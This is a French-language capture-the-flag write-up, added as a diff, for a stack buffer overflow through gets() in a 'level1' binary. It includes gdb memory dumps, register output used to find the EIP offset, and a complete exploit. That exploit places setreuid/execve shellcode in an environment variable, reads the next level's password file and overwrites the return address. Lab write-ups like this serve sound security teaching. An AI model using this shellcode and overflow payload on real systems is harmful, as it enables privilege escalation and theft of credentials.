@@ -1,0 +1,90 @@
+- Apres avoir explorer le contenu du binaire avec on voit que le main cette fois-ci un appel
+a gets qui va déboucher sur un overflow
+
+- Avec l'overflow on va modifier eip pour pointer vers du code a executer
+
+- On met du shellcode en dans une variable d'environnement
+
+- On détermine avec gdb ou se trouve la variable d'environement :
+
+break main
+r
+x/1024xg $esp
+
+
+0xbffffe68:     0x474e414c00316c65      0x552e53555f6e653d
+0xbffffe78:     0x544f5400382d4654      0x9090909090903d4f
+0xbffffe88:     0x9090909090909090      0x9090909090909090
+0xbffffe98:     0x9090909090909090      0x9090909090909090
+0xbffffea8:     0x9090909090909090      0x9090909090909090
+0xbffffeb8:     0x9090909090909090      0x9090909090909090
+0xbffffec8:     0x9090909090909090      0x9090909090909090
+0xbffffed8:     0x9090909090909090      0x466a909090909090
+0xbffffee8:     0xeb80cdc931db3158      0x665299580b6a5f21
+0xbffffef8:     0x2f6852e689632d68      0x6e69622f6868732f
+
+- Le shellcode va faire un setreuid(0, 0), faire un execve de /bin/sh et ensuite executer des commandes
+
+- /bin/sh est un lien symbolique vers dash (sh -p) qui permet d avoir un shell avec le euid plutot
+que le uid quand ceux-ci sont different
+
+- On détermine la taille du payload en envoyant differente taille de string
+sous gdb et en printant les registre apres le segfault
+
+Ex1 :
+
+python -c 'print "A" * 100' > /tmp/test1
+gdb ./level1
+r < /tmp/test1
+i r
+
+(gdb) i r
+eax            0xbffff630       -1073744336
+ecx            0xb7fd28c4       -1208145724
+edx            0xbffff630       -1073744336
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff680       0xbffff680
+ebp            0x41414141       0x41414141
+esi            0x0      0
+edi            0x0      0
+eip            0x41414141       0x41414141
+eflags         0x210282 [ SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+
+Ex2 :
+
+python -c 'print "A" * 70 +  "B" * 30' > /tmp/test1
+gdb ./level1
+r < /tmp/test1
+i r
+
+(gdb) i r
+eax            0xbffff630       -1073744336
+ecx            0xb7fd28c4       -1208145724
+edx            0xbffff630       -1073744336
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff680       0xbffff680
+ebp            0x42424242       0x42424242
+esi            0x0      0
+edi            0x0      0
+eip            0x42424242       0x42424242
+eflags         0x210282 [ SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+
+Exploit :
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level2/.pass; whoami; exit"'`
+
+(python -c 'print "A" * 76 + "\xb8\xfe\xff\xbf"') | ./level1
